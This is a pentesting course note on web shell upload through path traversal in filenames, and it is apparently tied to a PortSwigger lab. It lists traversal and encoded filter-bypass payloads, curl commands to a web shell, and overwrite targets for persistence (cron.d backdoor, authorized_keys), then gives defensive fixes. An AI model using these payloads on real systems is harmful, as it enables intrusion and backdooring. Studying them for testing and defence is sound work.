---
tags: [vapt, file-upload, path-traversal, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.07 File Upload + Path Traversal"
portswigger_labs: ["Web shell upload via path traversal"]
---

# 22.07 — File Upload + Path Traversal

## Why Combine Upload with Path Traversal?

```
SCENARIO:
  App stores uploads in: /var/www/html/uploads/ (safe!)
  But: filename is user-controlled and not sanitized
  
  User provides: ../evil.php
  
  APP SAVES: /var/www/html/uploads/../evil.php
  RESOLVES TO: /var/www/html/evil.php
  
  NOW: evil.php is in the web ROOT → PHP executes it!
  
  Even if /uploads/ has PHP execution disabled:
  → The webshell ends up in a different directory where PHP works!
```

---

## Path Traversal Payloads for Filename

```
GOAL: Move file from /uploads/ to another directory

RELATIVE TRAVERSAL:
  ../evil.php            → /var/www/html/evil.php
  ../../evil.php         → /var/www/evil.php
  ../../../evil.php      → /var/evil.php
  
  ../shell.php           → web root (usually executable!)
  ../../cgi-bin/shell.cgi → cgi-bin (CGI execution!)
  
ENCODED TRAVERSAL (if filter strips ../):
  ..%2fshell.php         → ../shell.php (URL decoded)
  ..%252fshell.php       → ..%2fshell.php (double encoded)
  ..%c0%afshell.php      → Unicode encoding of /
  
COMBINED PAYLOAD:
  ../../shell.php%00.jpg (path traversal + null byte to bypass extension check)

ABSOLUTE PATH INJECTION (rare):
  /var/www/html/shell.php (if system accepts absolute paths)
```

---

## Testing Path Traversal in Filenames

```bash
# STEP 1: IDENTIFY THE FILENAME FIELD:
# In Burp, intercept upload → find filename= in Content-Disposition:
# Content-Disposition: form-data; name="file"; filename="photo.jpg"

# STEP 2: MODIFY FILENAME TO INCLUDE TRAVERSAL:
# In Burp Repeater:
# Content-Disposition: form-data; name="file"; filename="../shell.php"

# STEP 3: OBSERVE RESPONSE:
# Does it upload? → file might be written to parent directory!

# STEP 4: FIND THE FILE:
# It won't be at /uploads/shell.php
# Try: https://target.com/shell.php (web root)
curl -s "https://target.com/shell.php?cmd=id"
# → uid=... → PATH TRAVERSAL UPLOAD WORKED!

# STEP 5: TRY MULTIPLE LEVELS:
TRAVERSALS=(
  "../shell.php"
  "../../shell.php"
  "../../../shell.php"
  "..\shell.php"          # Windows
  "..%2fshell.php"       # URL encoded
  "..%252fshell.php"     # Double encoded
  "....//shell.php"      # If strip is non-recursive
)

for T in "${TRAVERSALS[@]}"; do
  echo "Testing: $T"
  # Upload with traversal filename...
  # Then check if accessible
done

# STEP 6: FIND WRITABLE DIRECTORIES (once RCE achieved):
# Use existing shell to find writable dirs:
curl "https://target.com/uploads/shell.php?cmd=find+/+\-writable+\-type+d+2>/dev/null"
```

---

## Bypassing Path Traversal Filters

```
FILTER: strip "../" from filename
  ....// → after stripping ../ → becomes ../  (still traversal!)
  ..././ → strip ./ → ../
  
FILTER: strip ".." sequences
  %2e%2e/ → URL decoded → ../
  %2e%2e%2f → ../
  ..%c0%af → Unicode slash → ../
  ..%ef%bc%8f → Fullwidth slash → ../

FILTER: replace ".." with ""
  ....// → strip ".." → // → still resolves?
  ..%00/ → null byte → depends on implementation

FILTER: Use absolute path
  If filter strips relative traversal but accepts absolute:
  /var/www/html/shell.php
  
APPROACH: Test each filter bypass + observe where file lands
  Look for: different file not found location → file moved elsewhere!
```

---

## Targeting Specific Files

```
WHAT TO OVERWRITE FOR RCE:

ON APACHE:
  ../../.htaccess → override config for parent directory!
  ../index.php → overwrite existing PHP file → execute!
  ../config.php → overwrite config → inject PHP code!
  
ON NGINX:
  ../../etc/nginx/nginx.conf → inject config (if writeable)
  
ON LINUX:
  /etc/cron.d/backdoor → scheduled code execution!
  ~/.ssh/authorized_keys → SSH access!
  /tmp/exploit.sh → write then execute!
  
ON WINDOWS:
  ..\web.config → inject IIS config
  ..\shell.aspx → write ASPX to web root
  
TIMING:
  Many Linux systems: new cron.d files → executed within 1 minute!
  Write to cron.d → wait → get reverse shell!
```

---

## Fix

```
PREVENTING PATH TRAVERSAL IN FILENAMES:

1. SANITIZE FILENAME — EXTRACT BASENAME ONLY:
   # Python:
   import os
   
   safe_name = os.path.basename(filename)
   # os.path.basename("../../shell.php") → "shell.php"
   # → ../  is stripped, only filename remains!
   
   # Also strip leading dots:
   safe_name = safe_name.lstrip('.')
   
   # PHP:
   $safe_name = basename($filename);
   
   # Node.js:
   const path = require('path');
   const safe_name = path.basename(filename);

2. BETTER: IGNORE USER FILENAME ENTIRELY:
   import uuid, mimetypes
   extension = '.jpg'  # from allowlist based on detected MIME, not input filename!
   safe_name = str(uuid.uuid4()) + extension
   # → User-provided filename is completely discarded

3. VALIDATE FINAL PATH DOESN'T ESCAPE UPLOAD DIR:
   import os
   
   upload_dir = '/var/uploads'
   safe_name = os.path.basename(filename)
   final_path = os.path.join(upload_dir, safe_name)
   final_path = os.path.realpath(final_path)  # resolve symlinks, .., etc.
   
   if not final_path.startswith(upload_dir + '/'):
       raise ValueError("Path traversal detected!")

4. RESTRICT UPLOAD DIRECTORY PERMISSIONS:
   chmod 755 /var/www/html/uploads/
   chown www-data:www-data /var/www/html/uploads/
   # Only www-data can write → web server can't write elsewhere
```

---

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]] — webshell upload
- [[14 - Overwriting Existing Files]] — overwriting via upload
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
